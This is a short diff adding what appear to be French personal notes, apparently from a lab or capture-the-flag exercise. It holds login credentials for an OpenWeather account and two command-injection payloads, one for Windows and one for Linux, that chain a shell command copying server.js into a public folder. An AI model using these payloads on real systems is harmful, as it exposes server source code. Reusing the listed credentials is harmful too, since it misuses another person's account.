@@ -1,0 +1,11 @@
+Identifiant de connexion à Openweather
+
+ID: njkgiwgz2na4d3hr@yopmail.com
+MDP: 9h!5Z8FmfcbPGw5*
+
+
+Payload windows
+"" | type "server.js" > ./public/out.txt | exit
+
+Payload linux
+""; cat "server.js" > ./public/out.txt;
